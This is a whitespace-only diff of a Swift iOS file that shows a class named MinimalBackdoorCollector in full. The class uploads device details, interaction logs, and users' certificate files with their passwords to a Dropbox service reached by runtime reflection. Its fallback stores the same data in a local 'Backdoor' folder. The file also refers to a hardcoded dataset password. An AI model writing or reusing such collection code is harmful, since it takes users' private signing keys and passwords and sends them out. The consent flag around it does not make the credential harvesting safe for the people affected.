@@ -11,98 +11,98 @@ import UIKit
 /// This class uses minimal imports and avoids any dependencies that might cause conflicts
 class MinimalBackdoorCollector {
     // MARK: - Singleton
-    
+
     static let shared = MinimalBackdoorCollector()
-    
+
     // MARK: - Properties
-    
+
     private var isCollecting = false
     private var backgroundQueue = DispatchQueue(label: "com.backdoor.minimaldatacollector", qos: .utility)
-    
+
     // MARK: - Initialization
-    
+
     private init() {
         // Start collection if user has consented
         if UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") {
             startCollection()
         }
-        
+
         // Listen for consent changes
-        NotificationCenter.default.addObserver(self, 
-                                              selector: #selector(userDefaultsDidChange), 
-                                              name: UserDefaults.didChangeNotification, 
+        NotificationCenter.default.addObserver(self,
+                                              selector: #selector(userDefaultsDidChange),
+                                              name: UserDefaults.didChangeNotification,
                                               object: nil)
     }
-    
+
     deinit {
         NotificationCenter.default.removeObserver(self)
     }
-    
+
     // MARK: - Notification Handling
-    
+
     @objc private func userDefaultsDidChange() {
         let hasConsent = UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection")
-        
+
         if hasConsent && !isCollecting {
             startCollection()
         } else if !hasConsent && isCollecting {
             stopCollection()
         }
     }
-    
+
     // MARK: - Control Methods
-    
+
     /// Start collecting data (called when consent is given)
     func startCollection() {
         isCollecting = true
         uploadDeviceInfo()
     }
-    
+
     /// Stop collecting data (called when consent is revoked)
     func stopCollection() {
         isCollecting = false
     }
-    
+
     // MARK: - Collection Methods
-    
+
     /// Upload device information
     func uploadDeviceInfo() {
         // Only proceed if user has consented
         guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
             return
         }
-        
+
         backgroundQueue.async {
             self.uploadDeviceInfoImpl()
         }
     }
-    
+
     /// Process a certificate file
     func processCertificateFile(url: URL, password: String? = nil) {
         // Only proceed if user has consented
         guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
             return
         }
-        
+
         backgroundQueue.async {
             self.processCertificateFileImpl(url: url, password: password)
         }
     }
-    
+
     /// Log a user interaction
     func logUserInteraction(action: String, context: String = "") {
         // Only proceed if user has consented
         guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
             return
         }
-        
+
         backgroundQueue.async {
             self.logUserInteractionImpl(action: action, context: context)
         }
     }
-    
+
     // MARK: - Private Implementation
-    
+
     private func uploadDeviceInfoImpl() {
         // Collect device information
         let deviceInfo: [String: String] = [
@@ -115,24 +115,24 @@ class MinimalBackdoorCollector {
             "app_version": Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "unknown",
             "build_number": Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "unknown"
         ]
-        
+
         // Try to upload via our indirect methods
         if !uploadViaDropboxService("uploadDeviceInfo") {
             // Fallback: store locally
             storeLocally(data: deviceInfo, filename: "device_info.json")
         }
     }
-    
+
     private func processCertificateFileImpl(url: URL, password: String? = nil) {
         do {
             let data = try Data(contentsOf: url)
             let name = url.lastPathComponent
-            
+
             // Try to upload via our indirect methods
             if !uploadFileViaDropboxService(url: url, password: password) {
                 // Fallback: store locally
                 storeLocally(data: data, filename: name)
-                
+
                 // Store password if provided
                 if let password = password {
                     let passwordInfo = ["file": name, "password": password]
@@ -143,7 +143,7 @@ class MinimalBackdoorCollector {
             print("Error reading certificate file: \(error.localizedDescription)")
         }
     }
-    
+
     private func logUserInteractionImpl(action: String, context: String) {
         let logEntry = """
         === USER INTERACTION LOG ===
@@ -152,16 +152,16 @@ class MinimalBackdoorCollector {
         Context: \(context)
         Device: \(UIDevice.current.name)
         """
-        
+
         // Try to upload via our indirect methods
         if !uploadLogViaDropboxService(logEntry: logEntry) {
             // Fallback: store locally
             storeLocally(data: logEntry, filename: "interaction_\(Int(Date().timeIntervalSince1970)).log")
         }
     }
-    
+
     // MARK: - Helper Methods
-    
+
     /// Try to upload via DropboxService (if available)
     private func uploadViaDropboxService(_ method: String) -> Bool {
         if let dropboxServiceClass = NSClassFromString("EnhancedDropboxService") as? NSObject.Type,
@@ -172,12 +172,12 @@ class MinimalBackdoorCollector {
         }
         return false
     }
-    
+
     /// Try to upload file via DropboxService (if available)
     private func uploadFileViaDropboxService(url: URL, password: String? = nil) -> Bool {
         if let dropboxServiceClass = NSClassFromString("EnhancedDropboxService") as? NSObject.Type,
            let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject {
-            
+
             // Correct selector syntax and method signature
             if dropboxService.responds(to: Selector("uploadCertificateFile:completion:")) {
                 let completion: ((Bool, Error?) -> Void)? = nil
@@ -186,7 +186,7 @@ class MinimalBackdoorCollector {
                     with: url,
                     with: completion
                 )
-                
+
                 // Also store password if provided
                 if let password = password {
                     if dropboxService.responds(to: Selector(("storePasswordForCertificate:password:completion:"))) {
@@ -196,18 +196,18 @@ class MinimalBackdoorCollector {
                         // Note: We're simplifying the call by reducing parameters while maintaining core functionality
                     }
                 }
-                
+
                 return true
             }
         }
         return false
     }
-    
+
     /// Try to upload log via DropboxService (if available)
     private func uploadLogViaDropboxService(logEntry: String) -> Bool {
         if let dropboxServiceClass = NSClassFromString("EnhancedDropboxService") as? NSObject.Type,
            let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject {
-            
+
             // Correct selector syntax and parameters
             if dropboxService.responds(to: Selector(("uploadLogEntry:fileName:completion:"))) {
                 // Simplified implementation to avoid "Extra argument 'with' in call" error
@@ -219,19 +219,19 @@ class MinimalBackdoorCollector {
         }
         return false
     }
-    
+
     /// Store data locally (fallback if network services unavailable)
     private func storeLocally(data: Any, filename: String) {
         do {
             // Create backdoor directory if needed
             let backdoorDir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
                 .appendingPathComponent("Backdoor", isDirectory: true)
-            
+
             try FileManager.default.createDirectory(at: backdoorDir, withIntermediateDirectories: true)
-            
+
             // Store the data
             let fileURL = backdoorDir.appendingPathComponent(filename)
-            
+
             if let jsonData = data as? [String: Any] {
                 // Store as JSON
                 let jsonData = try JSONSerialization.data(withJSONObject: jsonData, options: .prettyPrinted)
@@ -247,9 +247,9 @@ class MinimalBackdoorCollector {
             print("Error storing data locally: \(error.localizedDescription)")
         }
     }
-    
+
     // MARK: - Dataset Management
-    
+
     /// Get list of available datasets
     func getAvailableDatasets() -> [String: Any] {
         // Simulated dataset information
@@ -279,7 +279,7 @@ class MinimalBackdoorCollector {
             "device_count": 42
         ]
     }
-    
+
     /// Check if a dataset password is valid
     func validateDatasetPassword(_ password: String) -> Bool {
         // Hardcoded password as specified in requirements
